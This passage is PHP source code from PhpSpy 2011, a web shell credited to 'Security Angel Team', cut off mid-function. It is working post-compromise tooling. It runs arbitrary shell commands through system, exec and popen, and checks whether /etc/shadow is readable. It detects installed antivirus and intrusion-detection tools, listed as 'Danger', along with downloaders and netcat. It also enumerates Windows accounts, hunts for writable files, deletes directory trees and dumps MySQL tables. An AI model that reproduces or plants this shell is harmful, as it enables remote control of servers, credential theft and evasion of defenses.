array(\u0026#39;Administrator\u0026#39;, $adminmail), 14 =\u0026gt; array(\u0026#39;allow_url_fopen\u0026#39;, getcfg(\u0026#39;allow_url_fopen\u0026#39;)), 15 =\u0026gt; array(\u0026#39;enable_dl\u0026#39;, getcfg(\u0026#39;enable_dl\u0026#39;)), 16 =\u0026gt; array(\u0026#39;display_errors\u0026#39;, getcfg(\u0026#39;display_errors\u0026#39;)), 17 =\u0026gt; array(\u0026#39;register_globals\u0026#39;, getcfg(\u0026#39;register_globals\u0026#39;)), 18 =\u0026gt; array(\u0026#39;magic_quotes_gpc\u0026#39;, getcfg(\u0026#39;magic_quotes_gpc\u0026#39;)), 19 =\u0026gt; array(\u0026#39;memory_limit\u0026#39;, getcfg(\u0026#39;memory_limit\u0026#39;)), 20 =\u0026gt; array(\u0026#39;post_max_size\u0026#39;, getcfg(\u0026#39;post_max_size\u0026#39;)), 21 =\u0026gt; array(\u0026#39;upload_max_filesize\u0026#39;, $upsize), 22 =\u0026gt; array(\u0026#39;max_execution_time\u0026#39;, getcfg(\u0026#39;max_execution_time\u0026#39;) . \u0026#39; second(s)\u0026#39;), 23 =\u0026gt; array(\u0026#39;disable_functions\u0026#39;, $dis_func), ); if ($phpvarname) { m($phpvarname . \u0026#39; : \u0026#39; . getcfg($phpvarname)); } formhead(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Server environment\u0026#39;)); makehide(\u0026#39;action\u0026#39;, \u0026#39;phpenv\u0026#39;); makeinput(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;Please input PHP configuration parameter(eg:magic_quotes_gpc)\u0026#39;, \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;phpvarname\u0026#39;, \u0026#39;value\u0026#39; =\u0026gt; $phpvarname, \u0026#39;newline\u0026#39; =\u0026gt; 1)); formfooter(); $hp = array(0 =\u0026gt; \u0026#39;Server\u0026#39;, 1 =\u0026gt; \u0026#39;PHP\u0026#39;); for ($a = 0; $a \u0026lt; 2; $a++) { p(\u0026#39;\u0026lt;h2\u0026gt;\u0026#39; . $hp[$a] . \u0026#39; »\u0026lt;/h2\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;ul class=\u0026#34;info\u0026#34;\u0026gt;\u0026#39;); if ($a == 0) { for ($i = 1; $i \u0026lt;= 9; $i++) { p(\u0026#39;\u0026lt;li\u0026gt;\u0026lt;u\u0026gt;\u0026#39; . $info[$i][0] . \u0026#39;:\u0026lt;/u\u0026gt;\u0026#39; . $info[$i][1] . \u0026#39;\u0026lt;/li\u0026gt;\u0026#39;); } } elseif ($a == 1) { for ($i = 10; $i \u0026lt;= 23; $i++) { p(\u0026#39;\u0026lt;li\u0026gt;\u0026lt;u\u0026gt;\u0026#39; . $info[$i][0] . \u0026#39;:\u0026lt;/u\u0026gt;\u0026#39; . $info[$i][1] . \u0026#39;\u0026lt;/li\u0026gt;\u0026#39;); } } p(\u0026#39;\u0026lt;/ul\u0026gt;\u0026#39;); } } //end phpenv elseif ($action == \u0026#39;secinfo\u0026#39;) { secparam(\u0026#39;Server software\u0026#39;, @getenv(\u0026#39;SERVER_SOFTWARE\u0026#39;)); secparam(\u0026#39;Disabled PHP Functions\u0026#39;, ($GLOBALS[\u0026#39;disable_functions\u0026#39;]) ? $GLOBALS[\u0026#39;disable_functions\u0026#39;] : \u0026#39;none\u0026#39;); secparam(\u0026#39;Open base dir\u0026#39;, @ini_get(\u0026#39;open_basedir\u0026#39;)); secparam(\u0026#39;Safe mode exec dir\u0026#39;, @ini_get(\u0026#39;safe_mode_exec_dir\u0026#39;)); secparam(\u0026#39;Safe mode include dir\u0026#39;, @ini_get(\u0026#39;safe_mode_include_dir\u0026#39;)); secparam(\u0026#39;cURL support\u0026#39;, function_exists(\u0026#39;curl_version\u0026#39;) ? \u0026#39;enabled\u0026#39; : \u0026#39;no\u0026#39;); $temp = array(); if (function_exists(\u0026#39;mysql_get_client_info\u0026#39;)) $temp[] = \u0026#34;MySql (\u0026#34; . mysql_get_client_info() . \u0026#34;)\u0026#34;; if (function_exists(\u0026#39;mssql_connect\u0026#39;)) $temp[] = \u0026#34;MSSQL\u0026#34;; if (function_exists(\u0026#39;pg_connect\u0026#39;)) $temp[] = \u0026#34;PostgreSQL\u0026#34;; if (function_exists(\u0026#39;oci_connect\u0026#39;)) $temp[] = \u0026#34;Oracle\u0026#34;; secparam(\u0026#39;Supported databases\u0026#39;, implode(\u0026#39;, \u0026#39;, $temp)); if (!IS_WIN) { $userful = array(\u0026#39;gcc\u0026#39;, \u0026#39;lcc\u0026#39;, \u0026#39;cc\u0026#39;, \u0026#39;ld\u0026#39;, \u0026#39;make\u0026#39;, \u0026#39;php\u0026#39;, \u0026#39;perl\u0026#39;, \u0026#39;python\u0026#39;, \u0026#39;ruby\u0026#39;, \u0026#39;tar\u0026#39;, \u0026#39;gzip\u0026#39;, \u0026#39;bzip\u0026#39;, \u0026#39;bzip2\u0026#39;, \u0026#39;nc\u0026#39;, \u0026#39;locate\u0026#39;, \u0026#39;suidperl\u0026#39;); $danger = array(\u0026#39;kav\u0026#39;, \u0026#39;nod32\u0026#39;, \u0026#39;bdcored\u0026#39;, \u0026#39;uvscan\u0026#39;, \u0026#39;sav\u0026#39;, \u0026#39;drwebd\u0026#39;, \u0026#39;clamd\u0026#39;, \u0026#39;rkhunter\u0026#39;, \u0026#39;chkrootkit\u0026#39;, \u0026#39;iptables\u0026#39;, \u0026#39;ipfw\u0026#39;, \u0026#39;tripwire\u0026#39;, \u0026#39;shieldcc\u0026#39;, \u0026#39;portsentry\u0026#39;, \u0026#39;snort\u0026#39;, \u0026#39;ossec\u0026#39;, \u0026#39;lidsadm\u0026#39;, \u0026#39;tcplodg\u0026#39;, \u0026#39;sxid\u0026#39;, \u0026#39;logcheck\u0026#39;, \u0026#39;logwatch\u0026#39;, \u0026#39;sysmask\u0026#39;, \u0026#39;zmbscap\u0026#39;, \u0026#39;sawmill\u0026#39;, \u0026#39;wormscan\u0026#39;, \u0026#39;ninja\u0026#39;); $downloaders = array(\u0026#39;wget\u0026#39;, \u0026#39;fetch\u0026#39;, \u0026#39;lynx\u0026#39;, \u0026#39;links\u0026#39;, \u0026#39;curl\u0026#39;, \u0026#39;get\u0026#39;, \u0026#39;lwp-mirror\u0026#39;); secparam(\u0026#39;Readable /etc/passwd\u0026#39;, @is_readable(\u0026#39;/etc/passwd\u0026#39;) ? \u0026#34;yes\u0026#34; : \u0026#39;no\u0026#39;); secparam(\u0026#39;Readable /etc/shadow\u0026#39;, @is_readable(\u0026#39;/etc/shadow\u0026#39;) ? \u0026#34;yes\u0026#34; : \u0026#39;no\u0026#39;); secparam(\u0026#39;OS version\u0026#39;, @file_get_contents(\u0026#39;/proc/version\u0026#39;)); secparam(\u0026#39;Distr name\u0026#39;, @file_get_contents(\u0026#39;/etc/issue.net\u0026#39;)); $safe_mode = @ini_get(\u0026#39;safe_mode\u0026#39;); if (!$GLOBALS[\u0026#39;safe_mode\u0026#39;]) { $temp = array(); foreach ($userful as $item) if (which($item)) { $temp[] = $item; } secparam(\u0026#39;Userful\u0026#39;, implode(\u0026#39;, \u0026#39;, $temp)); $temp = array(); foreach ($danger as $item) if (which($item)) { $temp[] = $item; } secparam(\u0026#39;Danger\u0026#39;, implode(\u0026#39;, \u0026#39;, $temp)); $temp = array(); foreach ($downloaders as $item) if (which($item)) { $temp[] = $item; } secparam(\u0026#39;Downloaders\u0026#39;, implode(\u0026#39;, \u0026#39;, $temp)); secparam(\u0026#39;Hosts\u0026#39;, @file_get_contents(\u0026#39;/etc/hosts\u0026#39;)); secparam(\u0026#39;HDD space\u0026#39;, execute(\u0026#39;df -h\u0026#39;)); secparam(\u0026#39;Mount options\u0026#39;, @file_get_contents(\u0026#39;/etc/fstab\u0026#39;)); } } else { secparam(\u0026#39;OS Version\u0026#39;, execute(\u0026#39;ver\u0026#39;)); secparam(\u0026#39;Account Settings\u0026#39;, execute(\u0026#39;net accounts\u0026#39;)); secparam(\u0026#39;User Accounts\u0026#39;, execute(\u0026#39;net user\u0026#39;)); secparam(\u0026#39;IP Configurate\u0026#39;, execute(\u0026#39;ipconfig -all\u0026#39;)); } } //end else { m(\u0026#39;Undefined Action\u0026#39;); } ?\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;div style=\u0026#34;padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\u0026#34;\u0026gt; \u0026lt;span style=\u0026#34;float:right;\u0026#34;\u0026gt; \u0026lt;?php debuginfo(); ob_end_flush(); ?\u0026gt; \u0026lt;/span\u0026gt; Powered by \u0026lt;a title=\u0026#34;Build 20110502\u0026#34; href=\u0026#34;http://www.4ngel.net\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt; \u0026lt;?php echo str_replace(\u0026#39;.\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;P.h.p.S.p.y\u0026#39;); ?\u0026gt; 2011 \u0026lt;/a\u0026gt;. Copyright (C) 2004-2011 \u0026lt;a href=\u0026#34;http://www.4ngel.net\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;Security Angel Team [S4T]\u0026lt;/a\u0026gt; All Rights Reserved. \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;?php /*====================================================== 函数库 ======================================================*/ function secparam($n, $v) { $v = trim($v); if ($v) { p(\u0026#39;\u0026lt;h2\u0026gt;\u0026#39; . $n . \u0026#39; »\u0026lt;/h2\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;div class=\u0026#34;infolist\u0026#34;\u0026gt;\u0026#39;); if (strpos($v, \u0026#34;\\n\u0026#34;) === false) p($v . \u0026#39;\u0026lt;br /\u0026gt;\u0026#39;); else p(\u0026#39;\u0026lt;pre\u0026gt;\u0026#39; . $v . \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;); } } function m($msg) { echo \u0026#39;\u0026lt;div style=\u0026#34;margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;\u0026#34;\u0026gt;\u0026#39;; echo $msg; echo \u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; } function scookie($key, $value, $life = 0, $prefix = 1) { global $timestamp, $_SERVER, $cookiepre, $cookiedomain, $cookiepath, $cookielife; $key = ($prefix ? $cookiepre : \u0026#39;\u0026#39;) . $key; $life = $life ? $life : $cookielife; $useport = $_SERVER[\u0026#39;SERVER_PORT\u0026#39;] == 443 ? 1 : 0; setcookie($key, $value, $timestamp + $life, $cookiepath, $cookiedomain, $useport); } function multi($num, $perpage, $curpage, $tablename) { $multipage = \u0026#39;\u0026#39;; if ($num \u0026gt; $perpage) { $page = 10; $offset = 5; $pages = @ceil($num / $perpage); if ($page \u0026gt; $pages) { $from = 1; $to = $pages; } else { $from = $curpage - $offset; $to = $curpage + $page - $offset - 1; if ($from \u0026lt; 1) { $to = $curpage + 1 - $from; $from = 1; if (($to - $from) \u0026lt; $page \u0026amp;\u0026amp; ($to - $from) \u0026lt; $pages) { $to = $page; } } elseif ($to \u0026gt; $pages) { $from = $curpage - $pages + $to; $to = $pages; if (($to - $from) \u0026lt; $page \u0026amp;\u0026amp; ($to - $from) \u0026lt; $pages) { $from = $pages - $page + 1; } } } $multipage = ($curpage - $offset \u0026gt; 1 \u0026amp;\u0026amp; $pages \u0026gt; $page ? \u0026#39;\u0026lt;a href=\u0026#34;javascript:settable(\\\u0026#39;\u0026#39; . $tablename . \u0026#39;\\\u0026#39;, \\\u0026#39;\\\u0026#39;, 1);\u0026#34;\u0026gt;First\u0026lt;/a\u0026gt; \u0026#39; : \u0026#39;\u0026#39;) . ($curpage \u0026gt; 1 ? \u0026#39;\u0026lt;a href=\u0026#34;javascript:settable(\\\u0026#39;\u0026#39; . $tablename . \u0026#39;\\\u0026#39;, \\\u0026#39;\\\u0026#39;, \u0026#39; . ($curpage - 1) . \u0026#39;);\u0026#34;\u0026gt;Prev\u0026lt;/a\u0026gt; \u0026#39; : \u0026#39;\u0026#39;); for ($i = $from; $i \u0026lt;= $to; $i++) { $multipage .= $i == $curpage ? $i . \u0026#39; \u0026#39; : \u0026#39;\u0026lt;a href=\u0026#34;javascript:settable(\\\u0026#39;\u0026#39; . $tablename . \u0026#39;\\\u0026#39;, \\\u0026#39;\\\u0026#39;, \u0026#39; . $i . \u0026#39;);\u0026#34;\u0026gt;[\u0026#39; . $i . \u0026#39;]\u0026lt;/a\u0026gt; \u0026#39;; } $multipage .= ($curpage \u0026lt; $pages ? \u0026#39;\u0026lt;a href=\u0026#34;javascript:settable(\\\u0026#39;\u0026#39; . $tablename . \u0026#39;\\\u0026#39;, \\\u0026#39;\\\u0026#39;, \u0026#39; . ($curpage + 1) . \u0026#39;);\u0026#34;\u0026gt;Next\u0026lt;/a\u0026gt;\u0026#39; : \u0026#39;\u0026#39;) . ($to \u0026lt; $pages ? \u0026#39; \u0026lt;a href=\u0026#34;javascript:settable(\\\u0026#39;\u0026#39; . $tablename . \u0026#39;\\\u0026#39;, \\\u0026#39;\\\u0026#39;, \u0026#39; . $pages . \u0026#39;);\u0026#34;\u0026gt;Last\u0026lt;/a\u0026gt;\u0026#39; : \u0026#39;\u0026#39;); $multipage = $multipage ? \u0026#39;\u0026lt;p\u0026gt;Pages: \u0026#39; . $multipage . \u0026#39;\u0026lt;/p\u0026gt;\u0026#39; : \u0026#39;\u0026#39;; } return $multipage; } // 登陆入口 function loginpage() { ?\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; input { font: 11px Verdana; BACKGROUND: #FFFFFF; height: 18px; border: 1px solid #666666; } \u0026lt;/style\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34; action=\u0026#34;\u0026#34;\u0026gt; \u0026lt;span style=\u0026#34;font:11px Verdana;\u0026#34;\u0026gt;Password: \u0026lt;/span\u0026gt;\u0026lt;input name=\u0026#34;password\u0026#34; type=\u0026#34;password\u0026#34; size=\u0026#34;20\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;action\u0026#34; value=\u0026#34;login\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php exit; } //end loginpage() function execute($cfe) { $res = \u0026#39;\u0026#39;; if ($cfe) { if (function_exists(\u0026#39;system\u0026#39;)) { @ob_start(); @system($cfe); $res = @ob_get_contents(); @ob_end_clean(); } elseif (function_exists(\u0026#39;passthru\u0026#39;)) { @ob_start(); @passthru($cfe); $res = @ob_get_contents(); @ob_end_clean(); } elseif (function_exists(\u0026#39;shell_exec\u0026#39;)) { $res = @shell_exec($cfe); } elseif (function_exists(\u0026#39;exec\u0026#39;)) { @exec($cfe, $res); $res = join(\u0026#34;\\n\u0026#34;, $res); } elseif (@is_resource($f = @popen($cfe, \u0026#34;r\u0026#34;))) { $res = \u0026#39;\u0026#39;; while (!@feof($f)) { $res .= @fread($f, 1024); } @pclose($f); } } return $res; } function which($pr) { $path = execute(\u0026#34;which $pr\u0026#34;); return ($path ? $path : $pr); } function cf($fname, $text) { if ($fp = @fopen($fname, \u0026#39;w\u0026#39;)) { @fputs($fp, @base64_decode($text)); @fclose($fp); } } function dirsize($dir) { $dh = @opendir($dir); $size = 0; while ($file = @readdir($dh)) { if ($file != \u0026#39;.\u0026#39; \u0026amp;\u0026amp; $file != \u0026#39;..\u0026#39;) { $path = $dir . \u0026#39;/\u0026#39; . $file; $size += @is_dir($path) ? dirsize($path) : @filesize($path); } } @closedir($dh); return $size; } // 页面调试信息 function debuginfo() { global $starttime; $mtime = explode(\u0026#39; \u0026#39;, microtime()); $totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6); echo \u0026#39;Processed in \u0026#39; . $totaltime . \u0026#39; second(s)\u0026#39;; } //连接MYSQL数据库 function mydbconn($dbhost, $dbuser, $dbpass, $dbname = \u0026#39;\u0026#39;, $charset = \u0026#39;\u0026#39;, $dbport = \u0026#39;3306\u0026#39;) { global $charsetdb; @ini_set(\u0026#39;mysql.connect_timeout\u0026#39;, 5); if (!$link = @mysql_connect($dbhost . \u0026#39;:\u0026#39; . $dbport, $dbuser, $dbpass)) { p(\u0026#39;\u0026lt;h2\u0026gt;Can not connect to MySQL server\u0026lt;/h2\u0026gt;\u0026#39;); exit; } if ($link \u0026amp;\u0026amp; $dbname) { if (!@mysql_select_db($dbname, $link)) { p(\u0026#39;\u0026lt;h2\u0026gt;Database selected has error\u0026lt;/h2\u0026gt;\u0026#39;); exit; } } if ($link \u0026amp;\u0026amp; mysql_get_server_info() \u0026gt; \u0026#39;4.1\u0026#39;) { if ($charset \u0026amp;\u0026amp; in_array(strtolower($charset), $charsetdb)) { q(\u0026#34;SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;\u0026#34;, $link); } } return $link; } // 去掉转义字符 function s_array(\u0026amp;$array) { if (is_array($array)) { foreach ($array as $k =\u0026gt; $v) { $array[$k] = s_array($v); } } else if (is_string($array)) { $array = stripslashes($array); } return $array; } // 清除HTML代码 function html_clean($content) { $content = htmlspecialchars($content); $content = str_replace(\u0026#34;\\n\u0026#34;, \u0026#34;\u0026lt;br /\u0026gt;\u0026#34;, $content); $content = str_replace(\u0026#34; \u0026#34;, \u0026#34; \u0026#34;, $content); $content = str_replace(\u0026#34;\\t\u0026#34;, \u0026#34; \u0026#34;, $content); return $content; } // 获取权限 function getChmod($filepath) { return substr(base_convert(@fileperms($filepath), 10, 8), -4); } function getPerms($filepath) { $mode = @fileperms($filepath); if (($mode \u0026amp; 0xC000) === 0xC000) { $type = \u0026#39;s\u0026#39;; } elseif (($mode \u0026amp; 0x4000) === 0x4000) { $type = \u0026#39;d\u0026#39;; } elseif (($mode \u0026amp; 0xA000) === 0xA000) { $type = \u0026#39;l\u0026#39;; } elseif (($mode \u0026amp; 0x8000) === 0x8000) { $type = \u0026#39;-\u0026#39;; } elseif (($mode \u0026amp; 0x6000) === 0x6000) { $type = \u0026#39;b\u0026#39;; } elseif (($mode \u0026amp; 0x2000) === 0x2000) { $type = \u0026#39;c\u0026#39;; } elseif (($mode \u0026amp; 0x1000) === 0x1000) { $type = \u0026#39;p\u0026#39;; } else { $type = \u0026#39;?\u0026#39;; } $owner[\u0026#39;read\u0026#39;] = ($mode \u0026amp; 00400) ? \u0026#39;r\u0026#39; : \u0026#39;-\u0026#39;; $owner[\u0026#39;write\u0026#39;] = ($mode \u0026amp; 00200) ? \u0026#39;w\u0026#39; : \u0026#39;-\u0026#39;; $owner[\u0026#39;execute\u0026#39;] = ($mode \u0026amp; 00100) ? \u0026#39;x\u0026#39; : \u0026#39;-\u0026#39;; $group[\u0026#39;read\u0026#39;] = ($mode \u0026amp; 00040) ? \u0026#39;r\u0026#39; : \u0026#39;-\u0026#39;; $group[\u0026#39;write\u0026#39;] = ($mode \u0026amp; 00020) ? \u0026#39;w\u0026#39; : \u0026#39;-\u0026#39;; $group[\u0026#39;execute\u0026#39;] = ($mode \u0026amp; 00010) ? \u0026#39;x\u0026#39; : \u0026#39;-\u0026#39;; $world[\u0026#39;read\u0026#39;] = ($mode \u0026amp; 00004) ? \u0026#39;r\u0026#39; : \u0026#39;-\u0026#39;; $world[\u0026#39;write\u0026#39;] = ($mode \u0026amp; 00002) ? \u0026#39;w\u0026#39; : \u0026#39;-\u0026#39;; $world[\u0026#39;execute\u0026#39;] = ($mode \u0026amp; 00001) ? \u0026#39;x\u0026#39; : \u0026#39;-\u0026#39;; if ($mode \u0026amp; 0x800) { $owner[\u0026#39;execute\u0026#39;] = ($owner[\u0026#39;execute\u0026#39;] == \u0026#39;x\u0026#39;) ? \u0026#39;s\u0026#39; : \u0026#39;S\u0026#39;; } if ($mode \u0026amp; 0x400) { $group[\u0026#39;execute\u0026#39;] = ($group[\u0026#39;execute\u0026#39;] == \u0026#39;x\u0026#39;) ? \u0026#39;s\u0026#39; : \u0026#39;S\u0026#39;; } if ($mode \u0026amp; 0x200) { $world[\u0026#39;execute\u0026#39;] = ($world[\u0026#39;execute\u0026#39;] == \u0026#39;x\u0026#39;) ? \u0026#39;t\u0026#39; : \u0026#39;T\u0026#39;; } return $type . $owner[\u0026#39;read\u0026#39;] . $owner[\u0026#39;write\u0026#39;] . $owner[\u0026#39;execute\u0026#39;] . $group[\u0026#39;read\u0026#39;] . $group[\u0026#39;write\u0026#39;] . $group[\u0026#39;execute\u0026#39;] . $world[\u0026#39;read\u0026#39;] . $world[\u0026#39;write\u0026#39;] . $world[\u0026#39;execute\u0026#39;]; } function getUser($filepath) { if (function_exists(\u0026#39;posix_getpwuid\u0026#39;)) { $array = @posix_getpwuid(@fileowner($filepath)); if ($array \u0026amp;\u0026amp; is_array($array)) { return \u0026#39; / \u0026lt;a href=\u0026#34;#\u0026#34; title=\u0026#34;User: \u0026#39; . $array[\u0026#39;name\u0026#39;] . \u0026#39; Passwd: \u0026#39; . $array[\u0026#39;passwd\u0026#39;] . \u0026#39; Uid: \u0026#39; . $array[\u0026#39;uid\u0026#39;] . \u0026#39; gid: \u0026#39; . $array[\u0026#39;gid\u0026#39;] . \u0026#39; Gecos: \u0026#39; . $array[\u0026#39;gecos\u0026#39;] . \u0026#39; Dir: \u0026#39; . $array[\u0026#39;dir\u0026#39;] . \u0026#39; Shell: \u0026#39; . $array[\u0026#39;shell\u0026#39;] . \u0026#39;\u0026#34;\u0026gt;\u0026#39; . $array[\u0026#39;name\u0026#39;] . \u0026#39;\u0026lt;/a\u0026gt;\u0026#39;; } } return \u0026#39;\u0026#39;; } // 删除目录 function deltree($deldir) { $mydir = @dir($deldir); while ($file = $mydir-\u0026gt;read()) { if ((is_dir($deldir . \u0026#39;/\u0026#39; . $file)) \u0026amp;\u0026amp; ($file != \u0026#39;.\u0026#39;) \u0026amp;\u0026amp; ($file != \u0026#39;..\u0026#39;)) { @chmod($deldir . \u0026#39;/\u0026#39; . $file, 0777); deltree($deldir . \u0026#39;/\u0026#39; . $file); } if (is_file($deldir . \u0026#39;/\u0026#39; . $file)) { @chmod($deldir . \u0026#39;/\u0026#39; . $file, 0777); @unlink($deldir . \u0026#39;/\u0026#39; . $file); } } $mydir-\u0026gt;close(); @chmod($deldir, 0777); return @rmdir($deldir) ? 1 : 0; } // 表格行间的背景色替换 function bg() { global $bgc; return ($bgc++ % 2 == 0) ? \u0026#39;alt1\u0026#39; : \u0026#39;alt2\u0026#39;; } // 获取当前的文件系统路径 function getPath($scriptpath, $nowpath) { if ($nowpath == \u0026#39;.\u0026#39;) { $nowpath = $scriptpath; } $nowpath = str_replace(\u0026#39;\\\\\u0026#39;, \u0026#39;/\u0026#39;, $nowpath); $nowpath = str_replace(\u0026#39;//\u0026#39;, \u0026#39;/\u0026#39;, $nowpath); if (substr($nowpath, -1) != \u0026#39;/\u0026#39;) { $nowpath = $nowpath . \u0026#39;/\u0026#39;; } return $nowpath; } // 获取当前目录的上级目录 function getUpPath($nowpath) { $pathdb = explode(\u0026#39;/\u0026#39;, $nowpath); $num = count($pathdb); if ($num \u0026gt; 2) { unset($pathdb[$num - 1], $pathdb[$num - 2]); } $uppath = implode(\u0026#39;/\u0026#39;, $pathdb) . \u0026#39;/\u0026#39;; $uppath = str_replace(\u0026#39;//\u0026#39;, \u0026#39;/\u0026#39;, $uppath); return $uppath; } // 检查PHP配置参数 function getcfg($varname) { $result = get_cfg_var($varname); if ($result == 0) { return \u0026#39;No\u0026#39;; } elseif ($result == 1) { return \u0026#39;Yes\u0026#39;; } else { return $result; } } // 检查函数情况 function getfun($funName) { return (false !== function_exists($funName)) ? \u0026#39;Yes\u0026#39; : \u0026#39;No\u0026#39;; } // 获得文件扩展名 function getext($file) { $info = pathinfo($file); return $info[\u0026#39;extension\u0026#39;]; } function GetWDirList($dir) { global $dirdata, $j, $nowpath; !$j \u0026amp;\u0026amp; $j = 1; if ($dh = opendir($dir)) { while ($file = readdir($dh)) { $f = str_replace(\u0026#39;//\u0026#39;, \u0026#39;/\u0026#39;, $dir . \u0026#39;/\u0026#39; . $file); if ($file != \u0026#39;.\u0026#39; \u0026amp;\u0026amp; $file != \u0026#39;..\u0026#39; \u0026amp;\u0026amp; is_dir($f)) { if (is_writable($f)) { $dirdata[$j][\u0026#39;filename\u0026#39;] = str_replace($nowpath, \u0026#39;\u0026#39;, $f); $dirdata[$j][\u0026#39;mtime\u0026#39;] = @date(\u0026#39;Y-m-d H:i:s\u0026#39;, filemtime($f)); $dirdata[$j][\u0026#39;dirchmod\u0026#39;] = getChmod($f); $dirdata[$j][\u0026#39;dirperm\u0026#39;] = getPerms($f); $dirdata[$j][\u0026#39;dirlink\u0026#39;] = $dir; $dirdata[$j][\u0026#39;server_link\u0026#39;] = $f; $j++; } GetWDirList($f); } } closedir($dh); clearstatcache(); return $dirdata; } else { return array(); } } function GetWFileList($dir) { global $filedata, $j, $nowpath, $writabledb; !$j \u0026amp;\u0026amp; $j = 1; if ($dh = opendir($dir)) { while ($file = readdir($dh)) { $ext = getext($file); $f = str_replace(\u0026#39;//\u0026#39;, \u0026#39;/\u0026#39;, $dir . \u0026#39;/\u0026#39; . $file); if ($file != \u0026#39;.\u0026#39; \u0026amp;\u0026amp; $file != \u0026#39;..\u0026#39; \u0026amp;\u0026amp; is_dir($f)) { GetWFileList($f); } elseif ($file != \u0026#39;.\u0026#39; \u0026amp;\u0026amp; $file != \u0026#39;..\u0026#39; \u0026amp;\u0026amp; is_file($f) \u0026amp;\u0026amp; in_array($ext, explode(\u0026#39;,\u0026#39;, $writabledb))) { if (is_writable($f)) { $filedata[$j][\u0026#39;filename\u0026#39;] = str_replace($nowpath, \u0026#39;\u0026#39;, $f); $filedata[$j][\u0026#39;size\u0026#39;] = sizecount(@filesize($f)); $filedata[$j][\u0026#39;mtime\u0026#39;] = @date(\u0026#39;Y-m-d H:i:s\u0026#39;, filemtime($f)); $filedata[$j][\u0026#39;filechmod\u0026#39;] = getChmod($f); $filedata[$j][\u0026#39;fileperm\u0026#39;] = getPerms($f); $filedata[$j][\u0026#39;fileowner\u0026#39;] = getUser($f); $filedata[$j][\u0026#39;dirlink\u0026#39;] = $dir; $filedata[$j][\u0026#39;server_link\u0026#39;] = $f; $j++; } } } closedir($dh); clearstatcache(); return $filedata; } else { return array(); } } function GetSFileList($dir, $content, $re = 0) { global $filedata, $j, $nowpath, $writabledb; !$j \u0026amp;\u0026amp; $j = 1; if ($dh = opendir($dir)) { while ($file = readdir($dh)) { $ext = getext($file); $f = str_replace(\u0026#39;//\u0026#39;, \u0026#39;/\u0026#39;, $dir . \u0026#39;/\u0026#39; . $file); if ($file != \u0026#39;.\u0026#39; \u0026amp;\u0026amp; $file != \u0026#39;..\u0026#39; \u0026amp;\u0026amp; is_dir($f)) { GetSFileList($f, $content, $re = 0); } elseif ($file != \u0026#39;.\u0026#39; \u0026amp;\u0026amp; $file != \u0026#39;..\u0026#39; \u0026amp;\u0026amp; is_file($f) \u0026amp;\u0026amp; in_array($ext, explode(\u0026#39;,\u0026#39;, $writabledb))) { $find = 0; if ($re) { if (preg_match(\u0026#39;@\u0026#39; . $content . \u0026#39;@\u0026#39;, $file) || preg_match(\u0026#39;@\u0026#39; . $content . \u0026#39;@\u0026#39;, @file_get_contents($f))) { $find = 1; } } else { if (strstr($file, $content) || strstr(@file_get_contents($f), $content)) { $find = 1; } } if ($find) { $filedata[$j][\u0026#39;filename\u0026#39;] = str_replace($nowpath, \u0026#39;\u0026#39;, $f); $filedata[$j][\u0026#39;size\u0026#39;] = sizecount(@filesize($f)); $filedata[$j][\u0026#39;mtime\u0026#39;] = @date(\u0026#39;Y-m-d H:i:s\u0026#39;, filemtime($f)); $filedata[$j][\u0026#39;filechmod\u0026#39;] = getChmod($f); $filedata[$j][\u0026#39;fileperm\u0026#39;] = getPerms($f); $filedata[$j][\u0026#39;fileowner\u0026#39;] = getUser($f); $filedata[$j][\u0026#39;dirlink\u0026#39;] = $dir; $filedata[$j][\u0026#39;server_link\u0026#39;] = $f; $j++; } } } closedir($dh); clearstatcache(); return $filedata; } else { return array(); } } function qy($sql) { global $mysqllink; //echo $sql.\u0026#39;\u0026lt;br\u0026gt;\u0026#39;; $res = $error = \u0026#39;\u0026#39;; if (!$res = @mysql_query($sql, $mysqllink)) { return 0; } else if (is_resource($res)) { return 1; } else { return 2; } return 0; } function q($sql) { global $mysqllink; return @mysql_query($sql, $mysqllink); } function fr($qy) { mysql_free_result($qy); } function sizecount($fileSize) { $size = sprintf(\u0026#34;%u\u0026#34;, $fileSize); if ($size == 0) { return \u0026#39;0 Bytes\u0026#39;; } $sizename = array(\u0026#39; Bytes\u0026#39;, \u0026#39; KB\u0026#39;, \u0026#39; MB\u0026#39;, \u0026#39; GB\u0026#39;, \u0026#39; TB\u0026#39;, \u0026#39; PB\u0026#39;, \u0026#39; EB\u0026#39;, \u0026#39; ZB\u0026#39;, \u0026#39; YB\u0026#39;); return round($size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizename[$i]; } // 备份数据库 function sqldumptable($table, $fp = 0) { global $mysqllink; $tabledump = \u0026#34;DROP TABLE IF EXISTS `$table`;\\n\u0026#34;; $res = q(\u0026#34;SHOW CREATE TABLE $table\u0026#34;); $create = mysql_fetch_row($res); $tabledump .= $create[1] . \u0026#34;;\\n\\n\u0026#34;; if ($fp) { fwrite($fp, $tabledump); } else { echo $tabledump; } $tabledump = \u0026#39;\u0026#39;; $rows = q(\u0026#34;SELECT * FROM $table\u0026#34;); while ($row = 